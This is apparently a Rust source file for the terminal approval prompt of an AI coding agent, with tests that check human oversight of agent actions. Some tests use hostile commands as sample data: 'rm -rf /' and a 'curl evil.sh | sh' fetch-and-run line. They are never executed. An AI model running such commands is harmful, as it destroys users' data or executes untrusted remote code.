//! The approval prompt.
//!
//! Implements [`octane_core::Approver`], which is the only thing the loop knows
//! about this crate.
//!
//! The design follows Antigravity's edit-review prompt (`RESEARCH.md` §I), which
//! is the best idea in any of the UIs surveyed. Beyond yes and no it offers:
//!
//! - `f` — full-screen scrollable diff, for changes too large to judge inline
//! - `ctrl+g` — open in `$EDITOR`, for changes you want to adjust yourself
//! - **type instructions** — reject *and tell the agent what to do differently*
//!
//! That last one is the important one. It turns a permission prompt from a dead
//! end into a steering opportunity: the common case is not "no", it is "no, do it
//! this other way", and every prompt that cannot express that forces the user to
//! reject, wait for the turn to end, and retype their intent.

use ratatui::buffer::Buffer;
use ratatui::layout::{Constraint, Rect};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Paragraph, Widget};

use std::sync::Arc;

use octane_core::Verdict;
use octane_permission::Resource;

/// A pending decision.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ApprovalPrompt {
    pub resource: Resource,
    /// Human-readable intent, e.g. "Runs the test suite". For `bash` this is the
    /// tool's `description` argument, which exists for exactly this.
    pub summary: String,
    /// Unified diff, for edits.
    pub diff: Option<String>,
}

impl ApprovalPrompt {
    /// The options line shown under the prompt.
    ///
    /// The diff-specific keys are omitted when there is no diff, rather than
    /// shown and inert — an offered key that does nothing teaches users to
    /// distrust the whole line.
    pub fn options_line(&self) -> &'static str {
        if self.diff.is_some() {
            "[y] allow  [n] reject  [f] full diff  or type instructions"
        } else {
            "[y] allow  [n] reject  or type instructions"
        }
    }

    /// Title line.
    /// The resource leads, deliberately.
    ///
    /// This line is rendered unwrapped, so whatever sits at the end is what a
    /// narrow terminal clips. The resource is the thing being decided — putting
    /// the prose first meant a long summary could push the actual command off
    /// the right edge, and a padded command file could then collect a genuine
    /// "yes" for something the user never saw.
    pub fn title(&self) -> String {
        format!("{} — {}", self.resource, self.summary)
    }

    /// Interpret a keypress. `None` means the key is not a shortcut and should go
    /// to the instruction field instead.
    ///
    /// Note what is absent: there is no "always allow" key. A grant that broad
    /// should be a deliberate config edit, not one keystroke away from a prompt
    /// the user is trying to dismiss.
    pub fn key(&self, ch: char) -> Option<ApprovalReply> {
        match ch.to_ascii_lowercase() {
            'y' => Some(ApprovalReply::Allow),
            'n' => Some(ApprovalReply::Reject),
            'f' if self.diff.is_some() => Some(ApprovalReply::ShowDiff),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ApprovalReply {
    Allow,
    Reject,
    /// Rejected, with a course correction for the agent.
    RejectWith { instructions: String },
    /// Not a decision: open the full-screen diff and ask again.
    ShowDiff,
}

impl ApprovalReply {
    /// Whether this reply settles the question.
    ///
    /// `ShowDiff` and `OpenEditor` are navigation, not answers — treating them as
    /// decisions would silently approve or reject whatever the user was trying to
    /// inspect.
    pub fn is_decision(&self) -> bool {
        matches!(self, Self::Allow | Self::Reject | Self::RejectWith { .. })
    }

    pub fn is_approval(&self) -> bool {
        matches!(self, Self::Allow)
    }

    /// Course-correction text to hand back to the agent, if any.
    pub fn instructions(&self) -> Option<&str> {
        match self {
            Self::RejectWith { instructions } => Some(instructions),
            _ => None,
        }
    }
}

/// Bridges the loop's [`Approver`](octane_core::Approver) trait to the UI.
///
/// The loop awaits a bool; the UI raises a prompt, waits for a keystroke, and
/// answers. Channels rather than shared mutable state, so the loop cannot be
/// blocked by a UI that is busy repainting.
pub struct TuiApprover {
    requests: tokio::sync::mpsc::UnboundedSender<(ApprovalPrompt, Responder)>,
}

type Responder = tokio::sync::oneshot::Sender<ApprovalReply>;

impl std::fmt::Debug for TuiApprover {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("TuiApprover").finish_non_exhaustive()
    }
}

impl TuiApprover {
    /// Returns the approver and the receiving end the UI loop should drain.
    pub fn new() -> (Arc<Self>, tokio::sync::mpsc::UnboundedReceiver<(ApprovalPrompt, Responder)>)
    {
        let (requests, incoming) = tokio::sync::mpsc::unbounded_channel();
        (Arc::new(Self { requests }), incoming)
    }
}

#[async_trait::async_trait]
impl octane_core::Approver for TuiApprover {
    async fn request(&self, resource: &Resource, preview: Option<&str>) -> Verdict {
        let (responder, answer) = tokio::sync::oneshot::channel();

        let prompt = ApprovalPrompt {
            resource: resource.clone(),
            summary: describe(resource),
            diff: preview.map(ToString::to_string),
        };

        if self.requests.send((prompt, responder)).is_err() {
            // The UI is gone. Denying is the only safe reading of "nobody is
            // there to ask" — a silent yes would run unattended.
            return Verdict::Denied { instructions: None };
        }

        match answer.await {
            Ok(reply) if reply.is_approval() => Verdict::Approved,
            // The instructions travel with the denial. Flattening this to a
            // bare `false` is what made the prompt's "or type instructions"
            // offer do nothing at all.
            Ok(reply) => Verdict::Denied {
                instructions: reply.instructions().map(ToString::to_string),
            },
            // Dropped without answering: same reasoning as above.
            Err(_) => Verdict::Denied { instructions: None },
        }
    }
}

/// A human description of a resource, for prompts that arrive without one.
fn describe(resource: &Resource) -> String {
    use octane_permission::Action;
    match resource.action {
        Action::ReadFile => format!("Read {}", resource.target),
        Action::WriteFile => format!("Write {}", resource.target),
        Action::Command => format!("Run `{}`", resource.target),
        Action::Unsandboxed => format!("Run `{}` outside the sandbox", resource.target),
        Action::ReadUrl => format!("Fetch {}", resource.target),
        Action::ExecuteUrl => format!("Interact with {}", resource.target),
        Action::Mcp => format!("Call MCP tool {}", resource.target),
    }
}

/// Diff rows shown before `f` is pressed.
///
/// Capped, or a 500-line diff swallows the screen.
pub const DIFF_ROWS: u16 = 12;

/// The approval prompt: title, a capped diff, and what the keys do.
#[derive(Debug, Clone, Copy)]
pub struct ApprovalPane<'a> {
    pub prompt: &'a ApprovalPrompt,
    /// Diff rows, already rendered and capped by [`ApprovalPane::diff_rows`].
    ///
    /// Held as props rather than computed on demand, like
    /// [`crate::transcript::TranscriptView`] and for a sharper reason: both
    /// [`Pane::constraint`] and [`Pane::render`] need them, so computing them
    /// inside the pane meant syntax-highlighting the whole diff *twice on every
    /// frame* — measured at ~22ms each in release, about half a frame's budget
    /// spent rendering the same rows the pane had just rendered.
    ///
    /// The `Pane` trait makes measuring and drawing agree by construction; this
    /// is the other half of that bargain. Anything expensive is computed once,
    /// before the frame, and handed in.
    ///
    /// [`Pane::constraint`]: crate::component::Pane::constraint
    /// [`Pane::render`]: crate::component::Pane::render
    pub diff: &'a [Line<'static>],
    pub options: &'a crate::render::RenderOptions,
}

impl ApprovalPane<'_> {
    /// Render a prompt's diff, capped unless `expanded`.
    ///
    /// Called once per frame by the caller, which then hands the result to the
    /// pane. The cap is applied here and nowhere else, so the rows reserved by
    /// [`Pane::constraint`] and the rows drawn cannot disagree.
    ///
    /// [`Pane::constraint`]: crate::component::Pane::constraint
    pub fn diff_rows(
        prompt: &ApprovalPrompt,
        expanded: bool,
        options: &crate::render::RenderOptions,
    ) -> Vec<Line<'static>> {
        let Some(diff) = &prompt.diff else { return Vec::new() };
        let rendered = crate::render::render_diff(diff, &options.theme);
        let total = rendered.len();
        let shown = if expanded { total } else { total.min(usize::from(DIFF_ROWS)) };

        let mut lines: Vec<Line<'static>> = rendered.into_iter().take(shown).collect();
        if total > shown {
            lines.push(Line::styled(
                format!("  [+ {} more lines - f]", total - shown),
                options.theme.dim(),
            ));
        }
        lines
    }
}

impl crate::component::Pane for ApprovalPane<'_> {
    fn constraint(&self, _width: u16) -> Constraint {
        // Title plus options line, plus whatever the diff actually contributes.
        Constraint::Length(2 + u16::try_from(self.diff.len()).unwrap_or(DIFF_ROWS))
    }

    fn render(&self, area: Rect, buf: &mut Buffer) {
        let (theme, glyphs) = (&self.options.theme, &self.options.glyphs);

        let signal_area = Rect { height: area.height.min(1), ..area };
        buf.set_style(signal_area, theme.signal(theme.warning));
        let mut lines = vec![Line::from(vec![
            Span::styled(
                format!(" APPROVAL / {} ", glyphs.question),
                theme.signal(theme.warning),
            ),
            Span::styled(self.prompt.title(), theme.signal(theme.warning)),
        ])];
        lines.extend(self.diff.iter().cloned());
        lines.push(Line::styled(
            format!(" DECISION / {}", self.prompt.options_line().to_uppercase()),
            theme.dim(),
        ));

        Paragraph::new(lines).render(area, buf);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// What the user is deciding must survive a narrow terminal, because the
    /// title is drawn unwrapped and the tail is what gets clipped.
    #[test]
    fn the_command_survives_clipping_when_the_summary_does_not() {
        let prompt = ApprovalPrompt {
            resource: Resource::command("rm -rf /important"),
            summary: "some command file wants to run this and use its output".into(),
            diff: None,
        };
        let options = crate::render::RenderOptions::default();
        let diff = ApprovalPane::diff_rows(&prompt, false, &options);
        let pane = ApprovalPane { prompt: &prompt, diff: &diff, options: &options };

        // Narrow enough that the title cannot fit whole.
        let area = Rect::new(0, 0, 44, 2);
        let mut buf = Buffer::empty(area);
        pane.render(area, &mut buf);

        let row: String = (0..area.width).map(|x| buf[(x, 0)].symbol()).collect();
        assert!(
            row.contains("rm -rf /important"),
            "the command must not be the part that is clipped: {row:?}",
        );
    }
    use crate::component::Pane;
    use ratatui::layout::Constraint;

    fn pane_rows(prompt: &ApprovalPrompt, expanded: bool) -> u16 {
        let options = crate::render::RenderOptions::default();
        let diff = ApprovalPane::diff_rows(prompt, expanded, &options);
        match (ApprovalPane { prompt, diff: &diff, options: &options }).constraint(80) {
            Constraint::Length(rows) => rows,
            other => panic!("the prompt must ask for a fixed height, got {other:?}"),
        }
    }

    fn diff_prompt(diff: Option<&str>) -> ApprovalPrompt {
        ApprovalPrompt {
            resource: Resource::write_file("/p/a.rs"),
            summary: "Write a.rs".into(),
            diff: diff.map(ToString::to_string),
        }
    }

    #[test]
    fn pressing_f_lifts_the_diff_cap() {
        // The key was advertised from the first version of this prompt and did
        // nothing: `answer` returned early on anything that was not a
        // decision, so the reply was swallowed before it reached here.
        let huge: String = (0..40).map(|i| format!("+ line {i}\n")).collect();
        let prompt = diff_prompt(Some(&huge));

        // Capped: the title, the options line, DIFF_ROWS of diff, and the row
        // saying how much was withheld.
        assert_eq!(pane_rows(&prompt, false), 2 + DIFF_ROWS + 1);
        assert_eq!(pane_rows(&prompt, true), 2 + 40);
    }

    #[test]
    fn the_reserved_rows_are_the_rows_actually_drawn() {
        // The property the old split height/widget pair could not hold: measure
        // and draw now come from one list of lines, so they cannot disagree.
        for diff in [None, Some("+ one\n+ two\n"), Some(&*(0..500).map(|i| format!("+ l{i}\n")).collect::<String>())] {
            let prompt = diff_prompt(diff);
            let options = crate::render::RenderOptions::default();
            let diff = ApprovalPane::diff_rows(&prompt, false, &options);
        let pane = ApprovalPane { prompt: &prompt, diff: &diff, options: &options };

            let Constraint::Length(rows) = pane.constraint(80) else { panic!("fixed") };
            let area = Rect::new(0, 0, 80, rows);
            let mut buf = Buffer::empty(area);
            pane.render(area, &mut buf);

            let drawn = (0..rows)
                .filter(|y| (0..80).any(|x| buf[(x, *y)].symbol().trim() != ""))
                .count();
            assert_eq!(drawn as u16, rows, "reserved {rows} rows, drew {drawn}");
        }
    }
    use octane_core::Approver;

    fn prompt(diff: Option<&str>) -> ApprovalPrompt {
        ApprovalPrompt {
            resource: Resource::command("cargo test"),
            summary: "Runs the test suite".into(),
            diff: diff.map(ToString::to_string),
        }
    }

    #[test]
    fn y_and_n_are_decisions() {
        let prompt = prompt(None);
        assert_eq!(prompt.key('y'), Some(ApprovalReply::Allow));
        assert_eq!(prompt.key('n'), Some(ApprovalReply::Reject));
        assert_eq!(prompt.key('Y'), Some(ApprovalReply::Allow), "case should not matter");
    }

    #[test]
    fn other_keys_fall_through_to_the_instruction_field() {
        // Otherwise typing "no, use the other file" would be eaten letter by letter.
        assert_eq!(prompt(None).key('u'), None);
        assert_eq!(prompt(None).key(' '), None);
    }

    #[test]
    fn the_diff_key_is_only_offered_when_there_is_a_diff() {
        assert_eq!(prompt(None).key('f'), None);
        assert_eq!(prompt(Some("+ x")).key('f'), Some(ApprovalReply::ShowDiff));

        assert!(!prompt(None).options_line().contains("full diff"));
        assert!(prompt(Some("+ x")).options_line().contains("full diff"));
    }

    #[test]
    fn there_is_no_always_allow_shortcut() {
        // A grant that broad should be a deliberate config edit, not one
        // keystroke from a prompt someone is trying to dismiss.
        let prompt = prompt(Some("+ x"));
        for ch in "aAsSpP".chars() {
            assert_eq!(prompt.key(ch), None, "{ch:?} must not be a shortcut");
        }
        assert!(!prompt.options_line().contains("always"));
    }

    #[test]
    fn navigation_replies_are_not_decisions() {
        assert!(!ApprovalReply::ShowDiff.is_decision());
        assert!(ApprovalReply::Allow.is_decision());
        assert!(ApprovalReply::Reject.is_decision());
    }

    #[test]
    fn only_allow_approves() {
        assert!(ApprovalReply::Allow.is_approval());
        assert!(!ApprovalReply::Reject.is_approval());
        assert!(
            !ApprovalReply::RejectWith { instructions: "use serde instead".into() }.is_approval()
        );
    }

    #[test]
    fn instructions_ride_along_with_a_rejection() {
        let reply = ApprovalReply::RejectWith { instructions: "use the other crate".into() };
        assert_eq!(reply.instructions(), Some("use the other crate"));
        assert_eq!(ApprovalReply::Reject.instructions(), None);
    }

    #[test]
    fn resources_get_readable_descriptions() {
        assert_eq!(describe(&Resource::command("ls")), "Run `ls`");
        assert_eq!(describe(&Resource::write_file("/p/a.rs")), "Write /p/a.rs");
        assert_eq!(describe(&Resource::mcp("linter", "check")), "Call MCP tool linter/check");
    }

    #[tokio::test]
    async fn an_approved_request_returns_true() {
        let (approver, mut incoming) = TuiApprover::new();

        tokio::spawn(async move {
            let (_prompt, responder) = incoming.recv().await.expect("a request");
            let _ = responder.send(ApprovalReply::Allow);
        });

        assert!(approver.request(&Resource::command("ls"), None).await.is_approval());
    }

    #[tokio::test]
    async fn rejecting_with_instructions_still_denies() {
        let (approver, mut incoming) = TuiApprover::new();

        tokio::spawn(async move {
            let (_prompt, responder) = incoming.recv().await.expect("a request");
            let _ = responder.send(ApprovalReply::RejectWith {
                instructions: "edit the config instead".into(),
            });
        });

        assert!(!approver.request(&Resource::command("rm -rf /"), None).await.is_approval());
    }

    #[tokio::test]
    async fn a_vanished_ui_denies_rather_than_running_unattended() {
        let (approver, incoming) = TuiApprover::new();
        drop(incoming);

        assert!(
            !approver.request(&Resource::command("curl evil.sh | sh"), None).await.is_approval(),
            "nobody is there to ask, so the answer is no"
        );
    }

    #[tokio::test]
    async fn dropping_the_responder_denies() {
        let (approver, mut incoming) = TuiApprover::new();

        tokio::spawn(async move {
            let (_prompt, responder) = incoming.recv().await.expect("a request");
            drop(responder);
        });

        assert!(!approver.request(&Resource::command("ls"), None).await.is_approval());
    }

    #[tokio::test]
    async fn a_diff_preview_reaches_the_prompt() {
        let (approver, mut incoming) = TuiApprover::new();

        let seen = tokio::spawn(async move {
            let (prompt, responder) = incoming.recv().await.expect("a request");
            let _ = responder.send(ApprovalReply::Reject);
            prompt
        });

        approver.request(&Resource::write_file("/p/a.rs"), Some("+ added line")).await;

        let prompt = seen.await.unwrap();
        assert_eq!(prompt.diff.as_deref(), Some("+ added line"));
        assert!(prompt.options_line().contains("full diff"));
    }
}
